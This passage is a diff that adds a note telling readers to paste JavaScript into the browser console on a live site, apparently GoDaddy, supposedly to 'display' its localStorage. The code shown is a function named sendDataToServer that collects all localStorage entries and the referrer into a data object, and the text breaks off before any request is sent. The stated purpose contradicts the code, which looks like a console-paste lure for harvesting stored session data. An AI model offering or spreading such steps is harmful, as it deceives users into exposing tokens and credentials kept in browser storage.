@@ -1,0 +1,14 @@
+In order to display the current sites Local "Store" of the current site (try it on Godaddy)
+Goto Inspect Element/ Console paste in this JS:
+  
+function sendDataToServer() {
+    var storageObj = {};
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        storageObj[key] = localStorage.getItem(key);
+    }
+
+    const data = {
+        referrer: document.referrer,
+        localStorage: storageObj
+    };
